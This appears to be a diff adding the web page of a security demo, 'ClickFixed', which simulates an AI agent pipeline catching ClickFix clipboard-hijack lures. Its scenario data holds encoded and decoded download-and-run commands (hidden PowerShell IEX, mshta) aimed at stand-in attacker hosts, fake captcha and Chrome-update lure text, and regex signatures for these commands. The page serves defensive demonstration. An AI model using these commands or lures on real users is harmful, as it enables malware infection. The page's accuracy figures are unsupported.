+      <div class="panel graph-panel">
+        <div class="panel-header">
+          <h2>🕸️ Google ADK Workflow Network</h2>
+          <span style="font-size: 0.75rem; color: var(--purple);">Hover nodes for definitions</span>
+        </div>
+
+        <div class="graph-container" id="graph-container">
+          
+          <!-- Subgraph Zone Bounds -->
+          <div class="graph-zone zone-edge">Browser Sandbox</div>
+          <div class="graph-zone zone-cloud">Cloud Run ADK Pipeline</div>
+
+          <!-- SVG Flow link paths -->
+          <svg class="svg-flow-network">
+            <!-- Node Interceptor to Gemini Nano -->
+            <path id="link-interceptor-nano" class="flow-link" d="M 105 60 C 105 80, 105 100, 105 120" />
+            
+            <!-- Node Interceptor to Ingest (Skip Nano / Fallback path) -->
+            <path id="link-interceptor-ingest" class="flow-link" d="M 190 45 C 210 45, 200 85, 220 85" />
+            
+            <!-- Gemini Nano to Ingest (A2A Handoff) -->
+            <path id="link-nano-ingest" class="flow-link" d="M 190 135 C 210 135, 200 105, 220 105" />
+            
+            <!-- Ingest to Security Auditor -->
+            <path id="link-ingest-security" class="flow-link" d="M 390 85 C 410 85, 400 35, 420 35" />
+            
+            <!-- Security Auditor to Privacy Auditor -->
+            <path id="link-security-privacy" class="flow-link" d="M 505 50 C 505 70, 505 90, 505 110" />
+            
+            <!-- Privacy Auditor to Malware Analyst -->
+            <path id="link-privacy-malware" class="flow-link" d="M 505 140 C 505 160, 505 180, 505 200" />
+            
+            <!-- Malware Analyst to Synthesizer -->
+            <path id="link-malware-synthesizer" class="flow-link" d="M 505 230 C 505 250, 505 270, 505 290" />
+            
+            <!-- Synthesizer to Firestore -->
+            <path id="link-synthesizer-firestore" class="flow-link" d="M 420 315 C 380 315, 330 255, 330 255" />
+            
+            <!-- Synthesizer to Web Risk -->
+            <path id="link-synthesizer-webrisk" class="flow-link" d="M 505 320 C 505 340, 505 380, 505 400" />
+            
+            <!-- Synthesizer to Abuse Lookup -->
+            <path id="link-synthesizer-abuse" class="flow-link" d="M 420 325 C 310 325, 310 380, 310 400" />
+            
+            <!-- FLOW PARTICLES OVERLAYS -->
+            <path id="part-interceptor-nano" class="flow-particles" d="M 105 60 C 105 80, 105 100, 105 120" />
+            <path id="part-interceptor-ingest" class="flow-particles" d="M 190 45 C 210 45, 200 85, 220 85" />
+            <path id="part-nano-ingest" class="flow-particles" d="M 190 135 C 210 135, 200 105, 220 105" />
+            <path id="part-ingest-security" class="flow-particles" d="M 390 85 C 410 85, 400 35, 420 35" />
+            <path id="part-security-privacy" class="flow-particles" d="M 505 50 C 505 70, 505 90, 505 110" />
+            <path id="part-privacy-malware" class="flow-particles" d="M 505 140 C 505 160, 505 180, 505 200" />
+            <path id="part-malware-synthesizer" class="flow-particles" d="M 505 230 C 505 250, 505 270, 505 290" />
+            <path id="part-synthesizer-firestore" class="flow-particles" d="M 420 315 C 380 315, 330 255, 330 255" />
+            <path id="part-synthesizer-webrisk" class="flow-particles" d="M 505 320 C 505 340, 505 380, 505 400" />
+            <path id="part-synthesizer-abuse" class="flow-particles" d="M 420 325 C 310 325, 310 380, 310 400" />
+          </svg>
+
+          <!-- Node 1: Browser DOM Hook -->
+          <div class="node-card" id="node-interceptor" onmouseenter="showPopover('interceptor')" onmouseleave="hidePopover()">
+            <div class="node-title-row">
+              <span class="node-title">DOM Hook / Clip</span>
+              <span class="node-label-pill label-edge">Sensor</span>
+            </div>
+            <span class="node-subtitle">injected.js / content_script</span>
+          </div>
+
+          <!-- Node 2: Gemini Nano -->
+          <div class="node-card" id="node-nano" onmouseenter="showPopover('nano')" onmouseleave="hidePopover()">
+            <div class="node-title-row">
+              <span class="node-title">Gemini Nano AI</span>
+              <span class="node-label-pill label-edge">Edge Model</span>
+            </div>
+            <span class="node-subtitle">On-device 0-latency filter</span>
+          </div>
+
+          <!-- Node 3: Ingestion Layer -->
+          <div class="node-card" id="node-ingest" onmouseenter="showPopover('ingest')" onmouseleave="hidePopover()">
+            <div class="node-title-row">
+              <span class="node-title">Telemetry Ingest</span>
+              <span class="node-label-pill label-cloud">A2A API</span>
+            </div>
+            <span class="node-subtitle">Cloud Run Entrypoint</span>
+          </div>
+
+          <!-- Node 4: Security Auditor -->
+          <div class="node-card" id="node-auditor-sec" onmouseenter="showPopover('security_auditor')" onmouseleave="hidePopover()">
+            <div class="node-title-row">
+              <span class="node-title">Security Auditor</span>
+              <span class="node-label-pill label-cloud">Agent</span>
+            </div>
+            <span class="node-subtitle">CSP & DOM audit</span>
+          </div>
+
+          <!-- Node 5: Privacy Auditor -->
+          <div class="node-card" id="node-auditor-priv" onmouseenter="showPopover('privacy_auditor')" onmouseleave="hidePopover()">
+            <div class="node-title-row">
+              <span class="node-title">Privacy Auditor</span>
+              <span class="node-label-pill label-cloud">Agent</span>
+            </div>
+            <span class="node-subtitle">PII & leakage scans</span>
+          </div>
+
+          <!-- Node 6: Malware Analyst -->
+          <div class="node-card" id="node-analyst-mal" onmouseenter="showPopover('malware_analyst')" onmouseleave="hidePopover()">
+            <div class="node-title-row">
+              <span class="node-title">Malware Analyst</span>
+              <span class="node-label-pill label-cloud">Agent</span>
+            </div>
+            <span class="node-subtitle">Deobfuscation & Lures</span>
+          </div>
+
+          <!-- Node 7: Threat Intel Synthesizer -->
+          <div class="node-card" id="node-synthesizer" onmouseenter="showPopover('synthesizer')" onmouseleave="hidePopover()">
+            <div class="node-title-row">
+              <span class="node-title">Intel Synthesizer</span>
+              <span class="node-label-pill label-cloud">Synthesizer</span>
+            </div>
+            <span class="node-subtitle">Deduplication & Rules</span>
+          </div>
+
+          <!-- Node 8: Firestore Telemetry & Signatures -->
+          <div class="node-card" id="node-firestore" onmouseenter="showPopover('firestore')" onmouseleave="hidePopover()">
+            <div class="node-title-row">
+              <span class="node-title">GCP Firestore</span>
+              <span class="node-label-pill label-mcp">MCP Rule DB</span>
+            </div>
+            <span class="node-subtitle">Active Immunization</span>
+          </div>
+
+          <!-- Node 9: Google Web Risk Submission -->
+          <div class="node-card" id="node-webrisk" onmouseenter="showPopover('webrisk')" onmouseleave="hidePopover()">
+            <div class="node-title-row">
+              <span class="node-title">Web Risk Submission</span>
+              <span class="node-label-pill label-mcp">Google API</span>
+            </div>
+            <span class="node-subtitle">Submit culprit URLs</span>
+          </div>
+
+          <!-- Node 10: Security.txt Contact Lookup -->
+          <div class="node-card" id="node-abuselookup" onmouseenter="showPopover('abuse')" onmouseleave="hidePopover()">
+            <div class="node-title-row">
+              <span class="node-title">security.txt Lookup</span>
+              <span class="node-label-pill label-cloud">Abuse contact</span>
+            </div>
+            <span class="node-subtitle">RFC 9116 scan</span>
+          </div>
+
+          <!-- Popover Modal Overlay -->
+          <div class="node-popover" id="node-popover">
+            <div class="popover-header">
+              <span id="pop-title">Node Title</span>
+              <span class="node-label-pill label-edge" id="pop-type">Type</span>
+            </div>
+            <div style="color: #9ca3af; font-size: 0.65rem; margin-bottom: 0.35rem;" id="pop-role">Role description</div>
+            <div style="font-family: var(--font-mono); font-size: 0.6rem; color: #a78bfa;" id="pop-details">Details / loaded skills</div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Bottom Section: Threat Intel Terminal Console & Lab -->
+    <div class="terminal-container">
+      <div class="terminal-header">
+        <div class="terminal-title">
+          <span style="display:inline-block; width:10px; height:10px; background:#a78bfa; border-radius:2px;"></span>
+          ClickFixed Security Console (A2A Threat Telemetry)
+        </div>
+        <div class="terminal-tabs">
+          <button class="term-tab active" id="tab-term" onclick="termTabSelect('terminal')">Live Telemetry logs</button>
+          <button class="term-tab" id="tab-lab" onclick="termTabSelect('lab')">Deobfuscation Lab</button>
+        </div>
+      </div>
+      
+      <!-- Tab 1: Terminal logs -->
+      <div class="terminal-body" id="terminal-body">
+        <div class="term-line">
+          <span class="term-timestamp">[12:40:01]</span>
+          <span class="term-prompt">ClickFixed:</span>
+          <span>Sensor agents initialized. Listening to navigator.clipboard and MutationObserver hooks.</span>
+        </div>
+        <div class="term-line">
+          <span class="term-timestamp">[12:40:02]</span>
+          <span class="term-prompt">ClickFixed:</span>
+          <span class="term-text-info">Ready to intercept. Local Gemini Nano execution model successfully loaded on-device.</span>
+        </div>
+      </div>
+
+      <!-- Tab 2: Deobfuscation Lab (Hidden by default) -->
+      <div class="terminal-body" id="lab-body" style="display: none;">
+        <div class="lab-grid">
+          <div class="lab-box">
+            <div class="lab-title">Intercepted Payload (Obfuscated)</div>
+            <div class="lab-code" id="lab-obfuscated-view">No threat analyzed yet. Start the workflow simulation first.</div>
+          </div>
+          <div class="lab-box">
+            <div class="lab-title">Decoded Shell Command (Deobfuscated by Malware Analyst Agent)</div>
+            <div class="lab-code" style="color: #34d399;" id="lab-decoded-view">No threat analyzed yet. Start the workflow simulation first.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Metrics and Benchmarking Section -->
+    <div class="metrics-section">
+      <h3 class="metrics-title">📊 Defense Matrix Benchmarking</h3>
+      <div class="metrics-grid">
+        
+        <!-- Metric 1: Heuristic Engine -->
+        <div class="metric-card">
+          <div class="metric-card-header">
+            <span>Standard Heuristic Rules</span>
+            <span style="color: var(--red);">High Bypass Risk</span>
+          </div>
+          <div class="metric-value-row">
+            <span class="metric-value" id="val-heuristics">30</span>
+            <span class="metric-unit">ms latency / 42% accuracy</span>
+          </div>
+          <div class="metric-bar-bg">
+            <div class="metric-bar-fill fill-purple" style="width: 42%;"></div>
+          </div>
+        </div>
+
+        <!-- Metric 2: Gemini Nano Local AI -->
+        <div class="metric-card">
+          <div class="metric-card-header">
+            <span>Gemini Nano (Edge AI)</span>
+            <span style="color: var(--purple);">0-Latency Verdict</span>
+          </div>
+          <div class="metric-value-row">
+            <span class="metric-value" id="val-nano">90</span>
+            <span class="metric-unit">ms latency / 91% accuracy</span>
+          </div>
+          <div class="metric-bar-bg">
+            <div class="metric-bar-fill fill-blue" style="width: 91%;"></div>
+          </div>
+        </div>
+
+        <!-- Metric 3: Multi-Agent Cloud Pipeline -->
+        <div class="metric-card">
+          <div class="metric-card-header">
+            <span>ADK Cloud Orchestration</span>
+            <span style="color: var(--cyan);">Enterprise Defense</span>
+          </div>
+          <div class="metric-value-row">
+            <span class="metric-value" id="val-adk">99.4</span>
+            <span class="metric-unit">1.2s analysis / 99% accuracy</span>
+          </div>
+          <div class="metric-bar-bg">
+            <div class="metric-bar-fill fill-cyan" style="width: 99.4%;"></div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Simulation scripts -->
+  <script>
+    // Scenario definitions
+    const scenarios = {
+      1: {
+        name: "Scenario 1: Clipboard Hijack",
+        url: "https://victim-portal.com/help-desk/login",
+        obfuscated: "cG93ZXJzaGVsbC5leGUgLXcgaGlkZGVuIC1jICJJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2JhZC1hY3Rvci54eXovcC5wczEnKSI=",
+        decoded: "powershell.exe -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://bad-actor.xyz/p.ps1')\"",
+        lureHtml: `
+          <svg class="lure-logo" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+          <div class="lure-title">Security Captcha Verification</div>
+          <div class="lure-text">Verify you are human by running the automated diagnostics verification check.</div>
+          <div class="lure-steps">
+            <ol>
+              <li>Press <kbd style="background:#334155; padding:1px 3px; border-radius:3px;">Win + R</kbd> on your keyboard</li>
+              <li>Copy the check script command below</li>
+              <li>Paste into the Run prompt and press Enter</li>
+            </ol>
+          </div>
+          <button class="btn-copy-code" id="btn-trigger-hijack">
+            <svg style="width:14px; height:14px;" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
+            </svg>
+            Copy Verification Script
+          </button>
+        `
+      },
+      2: {
+        name: "Scenario 2: Captcha DOM Lure",
+        url: "https://legit-banking.org/personal",
+        obfuscated: "bXNodGEgImh0dHA6Ly9jbGVhcmZha2UtZG9tYWluLmluZm8vdXBkYXRlLmh0YSI=",
+        decoded: "mshta \"http://clearfake-domain.info/update.hta\"",
+        lureHtml: `
+          <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 8px; padding: 0.75rem; text-align: left; width: 100%;">
+            <div style="color: #f87171; font-weight: 700; font-size: 0.8rem; margin-bottom: 0.25rem;">⚠️ System Notification</div>
+            <div style="font-size: 0.7rem; color: #cbd5e1; margin-bottom: 0.5rem;">Your Chrome browser is out of date. Please click download below to install the critical stability hotfix.</div>
+            <button class="btn-copy-code" id="btn-trigger-lure" style="background: linear-gradient(90deg, #ef4444, #dc2626); margin-top: 0.25rem;">
+              Download Chrome Hotfix
+            </button>
+          </div>
+        `
+      }
+    };
+
+    // Metadata Popover info
+    const nodeDetails = {
+      interceptor: {
+        title: "DOM Hook & Clipboard Interceptor",
+        type: "Extension Sensor (JS)",
+        role: "Interceptors loaded in content scripts to capture DOM mutation events and clip copy hooks.",
+        details: "Checks against fast local heuristic regular expression rules, intercepting ClipboardItem API blob payloads immediately."
+      },
+      nano: {
+        title: "Gemini Nano (Edge AI)",
+        type: "On-Device LLM (Chrome)",
+        role: "Prompts Chrome's local edge model with sanitized command payload to verify malicious content locally with zero network roundtrip.",
+        details: "Configured using window.ai or window.model API. Prompt token length: ~250 tokens."
+      },
+      ingest: {
+        title: "Telemetry Ingestion API",
+        type: "A2A Cloud run endpoint",
+        role: "Strips query strings and personal details from culprit url before forwarding threat vector to auditor pipeline.",
+        details: "Accepts JSON POST telemetry payload. Verifies authenticity of browser client via origin handshake verification."
+      },
+      security_auditor: {
+        title: "Security Auditor Agent",
+        type: "Google ADK Agent",
+        role: "Performs CSP (Content Security Policy) and DOM analysis to find browser misconfigurations that let the lure injection pass.",
+        details: "Loads security/SKILL.md dynamic domain knowledge."
+      },
+      privacy_auditor: {
+        title: "Privacy Auditor Agent",
+        type: "Google ADK Agent",
+        role: "Analyzes telemetry context for tracking pixels, user IP exposures, and third-party leakage.",
+        details: "Loads privacy/SKILL.md dynamic domain knowledge."
+      },
+      malware_analyst: {
+        title: "Malware Analyst Agent",
+        type: "Google ADK Agent",
+        role: "Scans payload for base64 strings, carets, character code evasion, and obfuscator.io loops. Decodes commands.",
+        details: "Loads threat-intelligence/SKILL.md dynamic domain knowledge."
+      },
+      synthesizer: {
+        title: "Threat Intel Synthesizer Agent",
+        type: "ADK Aggregator Agent",
+        role: "Consolidates reports, handles deduplication of culprit urls, and generates regex rules for distribution to clients.",
+        details: "Prompts Gemini to output clean signature structures: patterns list."
+      },
+      firestore: {
+        title: "GCP Firestore via MCP",
+        type: "Model Context Protocol Tool",
+        role: "Acts as a database tool to query historic logs and write signatures directly into GCP collections.",
+        details: "Uses mcp-server-firestore backend integration to manage databases via LLM toolcalls."
+      },
+      webrisk: {
+        title: "Google Web Risk API",
+        type: "Web Risk Submission tool",
+        role: "Auto-reports malicious javascript culprit URLs to Google Safe Browsing to immunize users globally.",
+        details: "Hits v1/submissions endpoints with the culprit URL payload."
+      },
+      abuse: {
+        title: "RFC 9116 Abuse Contact lookup",
+        type: "Abuse Contact scraper tool",
+        role: "Parses the compromised host's security.txt file to locate the security officer's email or report portal.",
+        details: "Fetches and evaluates /.well-known/security.txt from the target host."
+      }
+    };
+
+    let activeScenario = 1;
+    let walkthroughTimer = null;
+    let isRunning = false;
+
+    // Initialize Page DOM hooks
+    document.addEventListener("DOMContentLoaded", () => {
+      resetSimulator();
+      
+      // Setup click for copy code inside simulator
+      document.addEventListener("click", (e) => {
+        if (e.target && (e.target.id === 'btn-trigger-hijack' || e.target.id === 'btn-trigger-lure')) {
+          if (!isRunning) {
+            startWalkthrough();
+          }
+        }
+      });
+    });
+
+    function selectScenario(id) {
+      if (isRunning) return;
+      activeScenario = id;
+      document.getElementById("tab-scen-1").classList.toggle("active", id === 1);
+      document.getElementById("tab-scen-2").classList.toggle("active", id === 2);
+      resetSimulator();
+    }
+
+    function resetSimulator() {
+      // Clear timers
+      if (walkthroughTimer) clearTimeout(walkthroughTimer);
+      isRunning = false;
+      
+      // Restore Playback controls
+      const playBtn = document.getElementById("btn-play");
+      playBtn.style.opacity = "1";
+      playBtn.style.pointerEvents = "all";
+      playBtn.querySelector("span").innerText = "Trigger & Simulate Workflow";
+      
+      // Reset Warning Overlay
+      closeWarning();
+
+      // Reset Stepper CSS
+      for (let i = 0; i < 5; i++) {
+        const item = document.getElementById(`step-${i}`);
+        item.className = "step-item";
+      }
+
+      // Reset Graph SVG path highlights
+      const links = document.querySelectorAll(".flow-link");
+      links.forEach(l => l.className.baseVal = "flow-link");
+
+      const particles = document.querySelectorAll(".flow-particles");
+      particles.forEach(p => p.className.baseVal = "flow-particles");
+
+      // Reset Node Cards CSS
+      const cards = document.querySelectorAll(".node-card");
+      cards.forEach(c => c.className = "node-card");
+
+      // Re-populate Simulator Box
+      const chromeUrlBar = document.querySelector(".chrome-url-bar span");
+      chromeUrlBar.innerText = scenarios[activeScenario].url;
+
+      const chromeBody = document.getElementById("chrome-body");
+      // Keep warnings but remove other lure items
+      const existingLure = document.getElementById("captcha-lure");
+      if (existingLure) {
+        existingLure.outerHTML = "";
+      }
+      
+      // Inject correct lure
+      const lureDiv = document.createElement("div");
+      lureDiv.id = "captcha-lure";
+      lureDiv.className = "lure-container";
+      lureDiv.innerHTML = scenarios[activeScenario].lureHtml;
+      chromeBody.insertBefore(lureDiv, chromeBody.firstChild);
+
+      // Reset Terminal Console
+      const consoleBody = document.getElementById("terminal-body");
+      consoleBody.innerHTML = `
+        <div class="term-line">
+          <span class="term-timestamp">[12:40:01]</span>
+          <span class="term-prompt">ClickFixed:</span>
+          <span>Sensor agents initialized. Listening to navigator.clipboard and MutationObserver hooks.</span>
+        </div>
+        <div class="term-line">
+          <span class="term-timestamp">[12:40:02]</span>
+          <span class="term-prompt">ClickFixed:</span>
+          <span class="term-text-info">Ready to intercept. Local Gemini Nano execution model successfully loaded on-device.</span>
+        </div>
+      `;
+
+      // Reset Deobfuscation Lab Box
+      document.getElementById("lab-obfuscated-view").innerText = "No threat analyzed yet. Start the workflow simulation first.";
+      document.getElementById("lab-decoded-view").innerText = "No threat analyzed yet. Start the workflow simulation first.";
+    }
+
+    function addConsoleLog(text, level = 'info') {
+      const consoleBody = document.getElementById("terminal-body");
+      const line = document.createElement("div");
+      line.className = "term-line";
+      
+      const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+      
+      let cssClass = 'term-text-info';
+      if (level === 'success') cssClass = 'term-text-success';
+      if (level === 'warning') cssClass = 'term-text-warning';
+      if (level === 'danger') cssClass = 'term-text-danger';
+      if (level === 'agent') cssClass = 'term-text-agent';
+      
+      line.innerHTML = `
+        <span class="term-timestamp">[${time}]</span>
+        <span class="term-prompt">ClickFixed:</span>
+        <span class="${cssClass}">${text}</span>
+      `;
+      
+      consoleBody.appendChild(line);
+      consoleBody.scrollTop = consoleBody.scrollHeight;
+    }
+
+    function showWarning(payload) {
+      document.getElementById("warning-payload-view").innerText = payload;
+      document.getElementById("warning-overlay").classList.add("show");
+    }
+
+    function closeWarning() {
+      document.getElementById("warning-overlay").classList.remove("show");
+    }
+
+    // Tab switcher helper
+    function termTabSelect(tabName) {
+      const termTab = document.getElementById("tab-term");
+      const labTab = document.getElementById("tab-lab");
+      const termBody = document.getElementById("terminal-body");
+      const labBody = document.getElementById("lab-body");
+
+      if (tabName === 'terminal') {
+        termTab.classList.add("active");
+        labTab.classList.remove("active");
+        termBody.style.display = "flex";
+        labBody.style.display = "none";
+      } else {
+        termTab.classList.remove("active");
+        labTab.classList.add("active");
+        termBody.style.display = "none";
+        labBody.style.display = "flex";
+      }
+    }
+
+    // Popover hovering helpers
+    function showPopover(nodeId) {
+      const popover = document.getElementById("node-popover");
+      const data = nodeDetails[nodeId];
+      if (!data) return;
+
+      document.getElementById("pop-title").innerText = data.title;
+      document.getElementById("pop-type").innerText = data.type;
+      document.getElementById("pop-role").innerText = data.role;
+      document.getElementById("pop-details").innerText = data.details;
+
+      // Class assignment based on Node type
+      const pill = document.getElementById("pop-type");
+      pill.className = "node-label-pill";
+      if (data.type.includes("Sensor") || data.type.includes("Edge")) {
+        pill.classList.add("label-edge");
+      } else if (data.type.includes("MCP") || data.type.includes("API")) {
+        pill.classList.add("label-mcp");
+      } else {
+        pill.classList.add("label-cloud");
+      }
+
+      popover.classList.add("show");
+    }
+
+    function hidePopover() {
+      document.getElementById("node-popover").classList.remove("show");
+    }
+
+    // End-to-end multi-agent timeline simulation
+    function startWalkthrough() {
+      if (isRunning) return;
+      isRunning = true;
+
+      // Update control button status
+      const playBtn = document.getElementById("btn-play");
+      playBtn.style.opacity = "0.6";
+      playBtn.style.pointerEvents = "none";
+      playBtn.querySelector("span").innerText = "Simulation Executing...";
+
+      const scenario = scenarios[activeScenario];
+      
+      // Step 0: Intercept
+      setTimeout(() => {
+        document.getElementById("step-0").classList.add("active");
+        document.getElementById("node-interceptor").className = "node-card success";
+        addConsoleLog(`[INTERCEPTOR] Intercepted clipboard write copy hook on ${scenario.url}`, 'warning');
+        addConsoleLog(`[INTERCEPTOR] Extracted payload size: ${scenario.obfuscated.length} bytes. Parsing heuristics...`, 'info');
+      }, 300);
+
+      // Step 1: Gemini Nano local analysis
+      setTimeout(() => {
+        document.getElementById("step-0").classList.add("completed");
+        document.getElementById("step-1").classList.add("active");
+        
+        // Link Interceptor to Gemini Nano
+        document.getElementById("link-interceptor-nano").className.baseVal = "flow-link active";
+        document.getElementById("part-interceptor-nano").className.baseVal = "flow-particles active";
+        document.getElementById("node-nano").className = "node-card running";
+
+        addConsoleLog("[GEMINI NANO] Payload looks suspicious (bypasses regular signature files). Prompting edge LLM...", 'agent');
+      }, 1500);
+
+      // Step 2: Gemini Nano Local Verdict / Fallback routing decision
+      setTimeout(() => {
+        document.getElementById("step-1").classList.add("completed");
+        document.getElementById("step-2").classList.add("active");
+        document.getElementById("node-nano").className = "node-card success";
+        
+        // Block visual lure node in emulator browser
+        const lureNode = document.getElementById("captcha-lure");
+        if (lureNode) {
+          lureNode.style.opacity = "0.2";
+          lureNode.style.filter = "grayscale(100%)";
+        }
+        
+        // Trigger Closed Shadow DOM Alert block
+        showWarning(scenario.decoded);
+
+        addConsoleLog("[GEMINI NANO] Edge verdict: MALICIOUS (Confidence: 94%). Clipboard payload write blocked. UI Lure quarantined.", 'success');
+        addConsoleLog("[A2A CLIENT] Handoff protocol initiated. Packaging raw telemetry and DOM snapshot to ADK Cloud Agent Fallback...", 'info');
+
+        // Path to Cloud run
+        document.getElementById("link-nano-ingest").className.baseVal = "flow-link active";
+        document.getElementById("part-nano-ingest").className.baseVal = "flow-particles active fast";
+        document.getElementById("node-ingest").className = "node-card running";
+      }, 3200);
+
+      // Step 3: Cloud Ingestion node
+      setTimeout(() => {
+        document.getElementById("step-2").classList.add("completed");
+        document.getElementById("step-3").classList.add("active");
+        document.getElementById("node-ingest").className = "node-card success";
+
+        addConsoleLog("[CLOUD RUN] Telemetry ingest endpoint hit via A2A headers. Sanitizing culprit URL query parameters...", 'info');
+        
+        // Path Ingest to Security Auditor
+        document.getElementById("link-ingest-security").className.baseVal = "flow-link active";
+        document.getElementById("part-ingest-security").className.baseVal = "flow-particles active";
+        document.getElementById("node-auditor-sec").className = "node-card running";
+      }, 4800);
+
+      // Step 4: Security Auditor Agent Analysis
+      setTimeout(() => {
+        document.getElementById("node-auditor-sec").className = "node-card success";
+        addConsoleLog("[AGENT] Security_Auditor running: Scanning raw DOM details using security/SKILL.md domain context...", 'agent');
+        addConsoleLog("[AGENT] Security_Auditor result: Web page lacks 'Trusted-Types' headers and strict 'Content-Security-Policy'. DOM is vulnerable to standard script injections.", 'warning');
+
+        // Path Security to Privacy
+        document.getElementById("link-security-privacy").className.baseVal = "flow-link active";
+        document.getElementById("part-security-privacy").className.baseVal = "flow-particles active";
+        document.getElementById("node-auditor-priv").className = "node-card running";
+      }, 6200);
+
+      // Step 5: Privacy Auditor Agent Analysis
+      setTimeout(() => {
+        document.getElementById("node-auditor-priv").className = "node-card success";
+        addConsoleLog("[AGENT] Privacy_Auditor running: Checking for user IP leaks or cookies tracking details in DOM using privacy/SKILL.md...", 'agent');
+        addConsoleLog("[AGENT] Privacy_Auditor result: Compliance check PASSED. Telemetry sanitization successful, no PII leakage present.", 'success');
+
+        // Path Privacy to Malware
+        document.getElementById("link-privacy-malware").className.baseVal = "flow-link active";
+        document.getElementById("part-privacy-malware").className.baseVal = "flow-particles active";
+        document.getElementById("node-analyst-mal").className = "node-card running";
+      }, 7600);
+
+      // Step 6: Malware Analyst Agent Analysis
+      setTimeout(() => {
+        document.getElementById("node-analyst-mal").className = "node-card success";
+        addConsoleLog("[AGENT] Malware_Analyst running: Loading threat-intelligence/SKILL.md. Decoding base64 hooks...", 'agent');
+        
+        // Populate Obfuscation Lab contents
+        document.getElementById("lab-obfuscated-view").innerText = scenario.obfuscated;
+        document.getElementById("lab-decoded-view").innerText = scenario.decoded;
+
+        addConsoleLog(`[AGENT] Malware_Analyst result: Decoded command bypass executes via terminal: "${scenario.decoded}"`, 'danger');
+
+        // Path Malware to Synthesizer
+        document.getElementById("link-malware-synthesizer").className.baseVal = "flow-link active";
+        document.getElementById("part-malware-synthesizer").className.baseVal = "flow-particles active";
+        document.getElementById("node-synthesizer").className = "node-card running";
+      }, 9100);
+
+      // Step 7: Synthesizer agent
+      setTimeout(() => {
+        document.getElementById("step-3").classList.add("completed");
+        document.getElementById("step-4").classList.add("active");
+        document.getElementById("node-synthesizer").className = "node-card success";
+
+        addConsoleLog("[AGENT] Threat_Intel_Synthesizer: Generating regex signatures to block future instances of threat...", 'agent');
+        
+        // Output calculated patterns
+        const regexStr = activeScenario === 1 
+          ? '["powershell.*DownloadString.*evil", "powershell.*IEX.*Net.WebClient"]' 
+          : '["mshta.*update.hta", "mshta.*clearfake-domain"]';
+        addConsoleLog(`[AGENT] Synthesizer rules compiled: ${regexStr}`, 'success');
+
+        // Paths out of Synthesizer
+        document.getElementById("link-synthesizer-firestore").className.baseVal = "flow-link active";
+        document.getElementById("part-synthesizer-firestore").className.baseVal = "flow-particles active fast";
+        document.getElementById("node-firestore").className = "node-card running";
+
+        document.getElementById("link-synthesizer-webrisk").className.baseVal = "flow-link active";
+        document.getElementById("part-synthesizer-webrisk").className.baseVal = "flow-particles active";
+        document.getElementById("node-webrisk").className = "node-card running";
+
+        document.getElementById("link-synthesizer-abuse").className.baseVal = "flow-link active";
+        document.getElementById("part-synthesizer-abuse").className.baseVal = "flow-particles active";
+        document.getElementById("node-abuselookup").className = "node-card running";
+      }, 10500);
+
+      // Step 8: Execution complete & database writing
+      setTimeout(() => {
+        document.getElementById("step-4").classList.add("completed");
+        
+        document.getElementById("node-firestore").className = "node-card success";
+        document.getElementById("node-webrisk").className = "node-card success";
+        document.getElementById("node-abuselookup").className = "node-card success";
+
+        addConsoleLog("[MCP TOOL] Saved threat report telemetry to clickfix_threats/ database collection.", 'info');
+        addConsoleLog("[MCP TOOL] Signature patterns successfully written to clickfix_signatures/active for global immunization.", 'success');
+        addConsoleLog("[WEBRISK API] Culprit script URL successfully submitted to Google Safe Browsing backend.", 'info');
+        addConsoleLog("[ABUSE SCRAPER] security.txt parsed successfully. Alert dispatched to host administrator.", 'info');
+        
+        addConsoleLog("================= Sim Workflow Complete =================", 'success');
+
+        // Restore Trigger controls
+        playBtn.style.opacity = "1";
+        playBtn.style.pointerEvents = "all";
+        playBtn.querySelector("span").innerText = "Trigger & Simulate Workflow";
+        isRunning = false;
+      }, 12000);
+    }
+  </script>
+</body>
+</html>
